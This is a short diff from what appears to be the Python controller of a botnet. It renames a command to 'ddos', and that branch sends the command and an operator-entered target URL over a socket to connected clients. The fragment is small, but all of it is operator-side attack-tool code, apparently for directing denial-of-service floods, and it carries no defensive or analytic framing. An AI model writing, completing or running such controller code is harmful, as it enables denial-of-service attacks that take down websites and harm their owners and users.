@@ -45,7 +45,7 @@ class Controller(object):
                     if cmd == 'gg':
                         s.send('gg'.encode())
                         print(s.recv(1024).decode())
-                    elif cmd == 'start':
+                    elif cmd == 'ddos':
                         s.send(cmd.encode())
                         ui = input('enter url: ')
                         s.send(ui.encode())
